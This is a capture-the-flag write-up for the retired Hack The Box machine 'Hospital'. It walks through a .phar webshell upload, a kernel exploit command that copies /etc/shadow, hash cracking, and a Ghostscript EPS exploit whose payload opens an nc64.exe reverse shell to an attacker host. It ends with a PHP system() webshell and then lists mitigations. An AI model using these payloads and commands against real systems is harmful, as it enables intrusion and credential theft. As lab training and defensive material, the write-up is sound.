---
machine: Hospital
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, linux-vm, phar, cve-2023-35001, ghostscript, xampp]
---

# Hospital — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A Linux VM running a PHP application accepts `.phar` uploads; `popen` is not disabled and gives RCE. CVE-2023-35001 escalates to root on the VM and `/etc/shadow` leaks a Roundcube user's password. A malicious EPS exploits Ghostscript (CVE-2023-36664) when opened on Windows. XAMPP with a writable `htdocs` and Apache as SYSTEM leads to root.

## Reconnaissance

```bash
nmap -Pn -sC -sV -p22,443,445,8080,5985,3389 <IP>
```

- Linux VM: SSH and Apache/PHP on 8080.
- Windows DC: HTTPS/Roundcube, SMB, WinRM and RDP.
- The domain is `hospital.htb` and the DC is `dc.hospital.htb`.

## Enumeration

- The port 8080 application supports registration and image uploads.
- The extension filter accepts `.phar`.
- Roundcube on 443 authenticates domain users.

## Foothold

A `.phar` containing a `popen` webshell is uploaded. The function is missing from `disable_functions`, so it runs commands as `www-data`.

```bash
curl -b cookies.txt -F "image=@sh.phar" http://hospital.htb:8080/upload.php
curl "http://hospital.htb:8080/uploads/sh.phar?c=id"
```

## Escalation on the Linux VM

Kernel 5.19.0-35 is vulnerable to CVE-2023-35001, an out-of-bounds write in `nf_tables`. Synacktiv's public exploit obtains root and reads `/etc/shadow`.

```bash
# Transfer exploit.tar and run it from the webshell
(echo "cat /etc/shadow > /tmp/.shadow && chmod 644 /tmp/.shadow"; sleep 2) | ./exploit
```

`drwilliams`'s SHA-512 hash is cracked with `hashcat -m 1800`; the password is used in Roundcube.

## Lateral movement to Windows

`drbrown`'s mailbox contains an email requesting an EPS file for Ghostscript. An EPS with `%pipe%` is generated (CVE-2023-36664) and sent; when opened, Ghostscript runs the command and returns a shell as `hospital\drbrown`.

```bash
python3 CVE_2023_36664_exploit.py --inject \
  --payload 'cmd.exe /c \\<IP>\share\nc64.exe -e cmd <IP> 9001' \
  --filename file.eps
```

## Escalation to root

`C:\xampp\htdocs` grants write access to `BUILTIN\Users`, and Apache runs as `NT AUTHORITY\SYSTEM`. A PHP file is written and requested through `localhost`.

```cmd
icacls C:\xampp\htdocs
echo ^<?php system($_GET["c"]); ?^> > C:\xampp\htdocs\sh.php
curl -k "https://localhost/sh.php?c=whoami"
```

## Evidence

- `id` on the VM and `whoami` on Windows.
- Cracked hash and Roundcube access, with credentials redacted.
- EPS and `drbrown` callback.
- `icacls` and SYSTEM execution.
- Redacted flag.

## Lessons learned

- An extension allowlist must cover every executable variant.
- A PHP function denylist leaves gaps such as `popen`.
- A mail client opening attachments through Ghostscript inherits its execution surface.

## Mitigations and detection

- Reject `.phar`, `.phtml` and variants; validate content and real type.
- Use a PHP function allowlist and update the kernel.
- Update Ghostscript to 10.01.2 or later and block `%pipe%`.
- Remove write permissions from `htdocs` and do not run Apache as SYSTEM.

## References

- <https://www.hackthebox.com/machines/Hospital>
- <https://nvd.nist.gov/vuln/detail/CVE-2023-35001>
- <https://nvd.nist.gov/vuln/detail/CVE-2023-36664>
- <https://attack.mitre.org/techniques/T1190/>
